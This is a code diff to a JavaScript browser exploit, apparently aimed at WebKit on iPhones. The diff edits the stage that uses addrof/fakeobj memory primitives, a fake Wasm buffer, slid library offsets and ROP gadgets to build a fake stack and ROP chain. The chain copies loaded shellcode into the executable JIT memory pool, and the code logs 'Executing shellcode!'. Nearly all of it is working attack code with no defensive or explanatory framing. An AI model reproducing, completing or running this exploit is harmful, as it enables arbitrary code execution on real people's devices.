@@ -51,7 +51,8 @@
 			{
 
 				log.debug("Preparing exploit...\n");
-				new Uint8Array(workbuf).set(load_shellcode('shellcode.bin').u8,0x4000);
+				u8_buffer.set(load_shellcode('shellcode.bin').u8,0x4000);
+				alert("First 32-bit value of shellcode: "+hexify(new Uint32Array(workbuf)[0x4000]));
 				var prestage = {
 					offsets: function()
 					{
@@ -271,6 +272,7 @@
 	    var wasmBufferRawAddr = primitives.addrof(wasmBuffer);
 	    var wasmBufferAddr = Add(Int64.fromDouble(wasmBufferRawAddr), 16);
 	    
+
 	    log.info("Fake Wasm Memory @ " + wasmBufferAddr);
 	    
 	    var fakeWasmBuffer = primitives.fakeobj(wasmBufferAddr.asDouble());
@@ -528,19 +530,23 @@
 	    	log.info("Got an iPhone 8 or up. We must use the modern execution flow.");
 	    }
 
-	    log.debug("Finding the executable memorypool.");
-	   	
-	   	var startOfFixedExecutableMemoryPoolAddr = slideaddr(_off.startfixedmempool);
+		log.debug("Finding the executable memorypool.");
+		var startOfFixedExecutableMemoryPoolAddr = slideaddr(_off.startfixedmempool);
 	   	var endOfFixedExecutableMemoryPoolAddr = slideaddr(_off.endfixedmempool);
+
 	   	var startOfFixedExecutableMemoryPool = primitives.read_i64(startOfFixedExecutableMemoryPoolAddr, 0);
+		var endOfFixedExecutableMemoryPool = Add(startOfFixedExecutableMemoryPool, (0x20000/2));
+
 		var jscbase = slideaddr(_off.jscbase);
 		var disablePrimitiveGigacage = slideaddr(_off.disableprimitivegigacage);
+
 		var callbacks = primitives.read_i64(slideaddr(_off.callbacks), 0);
 		var g_gigacageBasePtrs = slideaddr(_off.g_gigacagebaseptrs);
-	    var g_typedArrayPoisons = slideaddr(_off.g_jsarraybufferpoison);
-	    var longjmp = slideaddr(_off.longjmp);
-	    var dlsym = slideaddr(_off.dlsym);
-	    var ptr_stack_chk_guard = slideaddr(_off.ptr_stack_check_guard);
+
+    	    	var g_typedArrayPoisons = slideaddr(_off.g_jsarraybufferpoison);
+	    	var longjmp = slideaddr(_off.longjmp);
+	    	var dlsym = slideaddr(_off.dlsym);
+	    	var ptr_stack_chk_guard = slideaddr(_off.ptr_stack_check_guard);
 		var linkcode_gadget = slideaddr(_off.linkcode_gadget);
 
 		log.info(''
@@ -555,7 +561,7 @@
 	        + '\njit_writeseperateheaps_func @ ' + (jitWriteSeparateHeapsFunctionAddr == slide ? "Offset missing" : hexify(jitWriteSeparateHeapsFunctionAddr))
 	        + '\nuseFastPermisionsJITCopy @ ' +  (useFastPermisionsJITCopyAddr == slide ? "Offset missing" : hexify(useFastPermisionsJITCopyAddr))
 	        + '\nstartfixedmempool @ ' + (startOfFixedExecutableMemoryPool == slide ? "Offset missing" : startOfFixedExecutableMemoryPool)
-	        + '\nendfixedmempool @ ' + (endOfFixedExecutableMemoryPoolAddr == slide ? "Offset missing" : hexify(endOfFixedExecutableMemoryPoolAddr))
+	        + '\nendfixedmempool @ ' + (endOfFixedExecutableMemoryPool == slide ? "Offset missing" : hexify(endOfFixedExecutableMemoryPool))
 	        + '\nptr_stack_check_guard @ ' + (ptr_stack_chk_guard == slide ? "Offset missing" : hexify(ptr_stack_chk_guard))
 	    );
 
@@ -565,58 +571,58 @@
 		var pop_x2 = slideaddr(_off.coreaudio_popx2);
 		log.info("pop_x2 gadget: "+hexify(pop_x2));
 
-		var buffer_addr = primitives.addrof(u32_buffer);
+		var buffer_addr = primitives.addrof(workbuf);
 		log.info("Shellcode buffer @ " +buffer_addr);
 
-		var shellcode_src = buffer_addr;
+		var shellcode_src = Add(buffer_addr, 0x4000);
 		log.info("Shellcode @ " + shellcode_src);
 
-		var shellcode_dst = startOfFixedExecutableMemoryPool+(0x20000/2);
+		var shellcode_dst = endOfFixedExecutableMemoryPool;
 		log.info("Shellcode target @ " + hexify(shellcode_dst));
 
 		log.debug("Preparing shellcode with dlsym offset.");
 		primitives.write_i64(shellcode_src, 4, dlsym);
-		 var fake_stack = [
-	    	0,
-	    	u32_buffer.byteLength, // x2
-	    	0,
+		var fake_stack = [
+	    		0,
+	    		u32_buffer.byteLength, // x2
+	    		0,
 
-	    	pop_x8,
+		    	pop_x8,
 
-	    	0, 0, 0, 0, 0,
-	    	shellcode_dst, // x8
-	    	0, 0, 0, 0,
-	    	primitives.read_i64(ptr_stack_chk_guard) + 0x58,
-	    	
-	    	linkcode_gadget,
-	    	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
-	        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+		    	0, 0, 0, 0, 0,
+		    	shellcode_dst, // x8
+		    	0, 0, 0, 0,
+		    	primitives.read_i64(ptr_stack_chk_guard) + 0x58,
 
-	        shellcode_dst,
+		    	linkcode_gadget,
+		    	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+		        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
 
+		        shellcode_dst,
 		];
 
 		u32_buffer[0] = longjmp % BASE32;
 		u32_buffer[1] = longjmp / BASE32;
 
 		for(var i = 0; i < fake_stack.length; ++i)
-	    {
-	    	u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32
-	        u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32
-	    }
+		{
+	    		u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32
+		        u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32
+		}
 
-	    var ropchain = new Uint32Array([
-	    	buffer_addr, //fake vtable
-	    	0,
-	    	shellcode_src, // x21
-	    	0, 0, 0, 0, 0, 0, 0,
-	        0, // frame pointer
-	        pop_x2, // linking register
-	        0,
-	        buffer_addr + 0x2000, // stack pointer (will point to our fake stack)
+		var ropchain = new Uint32Array([
+	    		buffer_addr, //fake vtable
+		    	0,
+		    	shellcode_src, // x21
+		    	0, 0, 0, 0, 0, 0, 0,
+		        0, // frame pointer
+		        pop_x2, // linking register
+		        0,
+		        buffer_addr + 0x2000, // stack pointer (will point to our fake stack)
 	   	]);
 
-	   	primitives.copyto(el, 0, ropchain.buffer, ropchain.byteLength);
+	   	primitives.copyto(el, 0, ropchain.buffer, ropchain.buffer.byteLength);
+
 
 	   	log.warn("Executing shellcode!");
 		millis(100);
